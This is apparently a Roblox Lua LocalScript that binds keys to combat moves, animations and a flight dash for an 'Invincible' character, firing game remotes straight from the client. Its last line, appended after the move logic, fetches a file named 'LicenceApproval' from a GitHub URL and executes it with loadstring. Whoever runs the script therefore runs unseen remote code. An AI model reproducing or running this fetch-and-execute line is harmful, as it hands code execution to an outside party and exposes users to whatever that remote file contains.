game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
    if gameProcessedEvent then
        return 
    end
   local plr = game:GetService("Players").LocalPlayer
   local char = plr.Character
  local InvScript = char:WaitForChild("Invincible")
 local Anims = InvScript:WaitForChild("Animations")

local Animator = char:FindFirstChild("Humanoid"):WaitForChild("Animator")
local ClapAnim = Animator:LoadAnimation(Anims.Clap)
local Repl = game:getService("ReplicatedStorage")
local function Counter()
local CounterWork = Instance.new("BoolValue")
CounterWork.Parent = char
CounterWork.Name = "CounterSucces"
game.Debris:AddItem(CounterWork, .05)

end

    if input.KeyCode == Enum.KeyCode.One then
Repl.Characters.Invincible.Remotes.Swipes:FireServer()
    
elseif input.KeyCode == Enum.KeyCode.Two then
Repl.Characters.Invincible.Remotes.ComboPunch:FireServer()
elseif input.KeyCode == Enum.KeyCode.Three then
task.spawn(Counter)
elseif input.KeyCode == Enum.KeyCode.Four then
ClapAnim:Play()
 game.ReplicatedStorage.Characters.OmniMan.Clap:FireServer(plr)
elseif input.KeyCode == Enum.KeyCode.Five then
local player = game.Players.LocalPlayer
local finisher = game.ReplicatedStorage.Characters.Invincible.Remotes.Finisher
finisher:FireServer(player)
elseif input.KeyCode == Enum.KeyCode.F then
-- Services
local Players = game:GetService("Players")

-- Local player and character
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Animation setup (using the correct animation ID)
local blockingAnimation = Instance.new("Animation")
blockingAnimation.AnimationId = "rbxassetid://9760917435" -- Replace with your animation ID
local blockingTrack = humanoid:WaitForChild("Animator"):LoadAnimation(blockingAnimation)

-- Remote event for Blocking
local blockingRemote = game.ReplicatedStorage.Characters.Combat.Remotes.Blocking

-- Function to perform Blocking
function PerformBlocking()
    -- Play the Blocking animation
    blockingTrack:Play()

    -- Fire the Blocking remote event
    blockingRemote:FireServer(player)
end

-- Example usage: Bind the function to a key or button

        PerformBlocking()

elseif input.KeyCode == Enum.KeyCode.E then
-- LocalScript (must be placed in a client-side container like StarterPlayerScripts, StarterCharacterScripts, etc.)

-- Services
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Debris = game:GetService("Debris")
local Players = game:GetService("Players")

-- Local player and character
local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local humanoid = char:WaitForChild("Humanoid")
local rootPart = char:WaitForChild("HumanoidRootPart")

-- Animation setup
local anim1 = Instance.new("Animation")
anim1.AnimationId = "rbxassetid://17427276488"
local animTrack1 = humanoid:WaitForChild("Animator"):LoadAnimation(anim1)

-- Play the animation and fire the flight remote
animTrack1:Play()
char.Invincible.Fly:FireServer(plr)

-- Movement setup (initial speed set to 180)
local Velocity = Instance.new("BodyVelocity")
Velocity.Parent = rootPart
Velocity.P = 5500
Velocity.MaxForce = Vector3.new(1000000, 1000000, 1000000) -- Apply force on all axes to lock Y position
Velocity.Velocity = rootPart.CFrame.lookVector * 180 -- Initial speed set to 180
Debris:AddItem(Velocity, 3)

-- Prevent falling by locking the Y-axis
local Gyro = Instance.new("BodyGyro")
Gyro.Parent = rootPart
Gyro.MaxTorque = Vector3.new(0, 1000000, 0) -- Lock rotation around the Y-axis
Gyro.P = 10000
Gyro.D = 1000
Debris:AddItem(Gyro, 3)

-- Camera effect
TweenService:Create(game.Workspace.CurrentCamera, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
    FieldOfView = 85
}):Play()

-- Hitbox setup
local Hitbox = game.ReplicatedStorage.Characters.Combat.Fx.CombatHitbox
local CloneHitbox = Hitbox:Clone()
CloneHitbox.Parent = char
local Weld = Instance.new("Weld", CloneHitbox)
Weld.Part0 = CloneHitbox
Weld.Part1 = rootPart
Weld.C0 = CFrame.new(0, 0, 3.5) * CFrame.Angles(0, 0, 0)
Debris:AddItem(CloneHitbox, 3)

-- Touched event for Hitbox
CloneHitbox.Touched:Connect(function(hit)
    local Parent = hit.Parent
    local Humanoid = Parent:FindFirstChild("Humanoid")
    if Humanoid and Humanoid.Health ~= 0 then
        local Values = Parent:FindFirstChild("Values")
        if Values and (Values.TeamColor.Value ~= char:FindFirstChild("Values").TeamColor.Value or Values.TeamColor.Value == game.ReplicatedStorage.FFAColor.Value) then
            game.ReplicatedStorage.Characters.Combat.Remotes.ComboEndRemote:FireServer(Parent)
            TweenService:Create(game.Workspace.CurrentCamera, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                FieldOfView = 70
            }):Play()
        end
    end
end)

-- Speedup logic
local initialSpeed = 180 -- Starting speed
local maxSpeed = 360 -- Speed to snap to after the duration
local speedupDelay = 1.5 -- Time (in seconds) before snapping to max speed

-- Function to update velocity
local function updateVelocity(speed)
    if Velocity and Velocity.Parent then
        local lookVector = rootPart.CFrame.lookVector
        Velocity.Velocity = Vector3.new(lookVector.X * speed, 0, lookVector.Z * speed)
    end
end

-- Continuously update velocity based on current look vector
local connection
connection = RunService.Heartbeat:Connect(function()
    updateVelocity(initialSpeed)
end)

-- Wait for the duration, then snap to max speed and continue updating direction
delay(speedupDelay, function()
    if connection then
        connection:Disconnect() -- Stop the initial speed updates
    end

    -- Create a new connection to update velocity with max speed
    connection = RunService.Heartbeat:Connect(function()
        updateVelocity(maxSpeed)
    end)
end)

-- Cleanup after 3 seconds
delay(3, function()
    if connection then
        connection:Disconnect()
    end

    -- Stop instantly by setting velocity to zero
    if Velocity and Velocity.Parent then
        Velocity.Velocity = Vector3.zero
        Velocity:Destroy() -- Destroy the BodyVelocity
    end

    -- Destroy the gyro object
    if Gyro and Gyro.Parent then
        Gyro:Destroy()
    end

    -- Re-enable gravity and falling
    humanoid:ChangeState(Enum.HumanoidStateType.Freefall) -- Allow falling again
end)

   end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
